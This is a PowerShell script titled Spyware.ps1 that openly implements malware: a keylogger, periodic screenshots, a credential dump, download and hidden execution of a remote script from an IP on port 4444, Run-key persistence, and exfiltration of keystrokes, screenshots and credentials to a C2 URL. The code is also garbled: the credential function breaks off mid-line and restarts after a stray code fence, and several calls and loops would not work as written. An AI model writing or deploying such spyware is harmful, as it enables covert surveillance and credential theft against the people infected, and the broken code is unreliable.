# Spyware.ps1
# Author: Rafi
# Purpose: Keylogger, screen capture, credential dump, reverse shell, persistence
# Persistent registry entry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Spyware
# C2 endpoint (Change to your own control server, e.g., https://mal.c2/collect)
$C2 = 'https://mal.c2/collect'
$ReverseIP = '203.0.113.10'   # C2 IP
$ReversePort = 4444           # Reverse shell port
$ExeDir = "$env:AppData\Spyware"
$ExePath = "$ExeDir\spyware.exe"

# ----------------- Utility Functions -----------------

# Send data as multipart/form-data
function Send-Data([hashtable]$data) {
    $boundary = "----POC_BOUNDARY_$(Get-Random)"
    $content = foreach ($key in $data.Keys) {
        "--$boundary"
        "Content-Disposition: form-data; name=`"$key`""
        "Content-Type: text/plain"
        ""
        $data[$key]
    }
    $content += "--$boundary--`r`n"
    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($content)

    $req = [System.Net.HttpWebRequest]::Create($C2)
    $req.Method = "POST"
    $req.ContentType = "multipart/form-data; boundary=$boundary"
    $req.ContentLength = $bodyBytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bodyBytes,0,$bodyBytes.Length)
    $stream.Close()
    try { $res = $req.GetResponse() } catch {}
}

# ----------------- Keylogger -----------------
$KeylogFile = Join-Path $ExeDir 'keylog.txt'
$buff = ""

$proc = Get-Process -Id $pid -ErrorAction SilentlyContinue
while ($true) {
    $curr = [System.Windows.Forms.Control]::FromHandle((Get-Process -Id $pid).MainWindowHandle)
    if($curr -ne $null) {
        $state = [System.Windows.Forms.Control]::GetState($curr.Handle)
        if($state -band 1) { # Key down
            $k = [System.Windows.Forms.Control]::GetAsyncKeyState([int]$state)
            $ch = [System.Windows.Forms.Control]::FromHandle((Get-Process -Id $pid).MainWindowHandle).Text
            $buff += $ch
            if($buff.Length -gt 2000) {
                Set-Content -Path $KeylogFile -Value ($buff -join '') -Encoding UTF8
                Send-Data @{type='keylog';data=$buff}
                $buff = ""
            }
        }
    }
    Start-Sleep -Milliseconds 100
}

# ----------------- Screenshot -----------------
$CaptureInterval = 30  # seconds
while ($true) {
    $imgPath = Join-Path $ExeDir ('screencapture_{0}.png' -f (Get-Date -Format 'yyyyMMdd_HHmmss'))
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save($imgPath)
    $bitmap.Dispose()
    $graphics.Dispose()
    Send-Data @{type='screenshot';path=$imgPath}
    Start-Sleep -Seconds $CaptureInterval
}

# ----------------- Credential Dump -----------------
function Dump-Credentials {
    $credList = cmdkey /list | Where-Object {$_ -match 'User: '}
    foreach ($line in $credList) {
        $app = ($line -split 'App: ')[1].Trim()
        $user = ($line -split 'User: ')[1].Trim()
        $creds = cmdkey /list /s $app | Where-Object {$_ -match 'User: '}
        # Store simply for exfil```powershell
function Dump-Credentials {
    $credList = cmdkey /list | Where-Object {$_ -match 'User: '}
    foreach ($line in $credList) {
        $app   = ($line -split 'App: ')[1].Trim()
        $user  = ($line -split 'User: ')[1].Trim()
        $cred  = cmdkey /list /s $app | Select-String 'User: ' -SimpleMatch
        $st    = $cred -match 'Password: (.+)'
        $pw    = if($?){$Matches[1]}else{'<unknown>'}
        $payload = @{
            type = 'cred'
            app  = $app
            user = $user
            pw   = $pw
        }
        Send-Data $payload
    }
}
# Run credential dump on startup
Dump-Credentials

# ----------------- Reverse Shell -----------------
$bytes = [System.Net.WebRequest]::Create("http://$ReverseIP:$ReversePort/$ReverseShell.ps1")
$bytes.RequestType = [System.Net.WebRequestMethods+Http]::Get
$script = [System.Text.Encoding]::Unicode.GetString($bytes.GetResponse().GetResponseStream().ReadBytes(1024))
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -EncodedCommand ([Base64]::Encode($([System.Text.Encoding]::Unicode.GetBytes($script))))"

# ----------------- Persistence -----------------
if(!(Test-Path $ExeDir)) { New-Item -Path $ExeDir -ItemType Directory | Out-Null }
# Convert script to binary .exe via PS2EXE if available
$psExe = "$ExeDir\spyware.exe"
if(!(Test-Path $psExe)) {
    if (Get-Command 'Invoke-PS2EXE' -ErrorAction SilentlyContinue) {
        Invoke-PS2EXE -inputFile $MyInvocation.MyCommand.Definition -outputFile $psExe
    } else {
        # fallback: wrap script in a single‑file exe via dotnet
        # Requires .NET SDK; omitted for brevity; keep script as .ps1 launcher.
    }
}
# Register run key
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "Spyware" -Value "$ExePath" -Force

# ----------------- C2 Exfil Intervals -----------------
$Header = @{
    "User-Agent" = "Spyware/1.0"
}
while ($true) {
    Start-Sleep -Seconds 60
    # exfiltration of recent keylog file
    if (Test-Path $KeylogFile) {
        $logData = Get-Content $KeylogFile -Raw
        Send-Data @{type='keylog';data=$logData}
        Clear-Content $KeylogFile
    }
}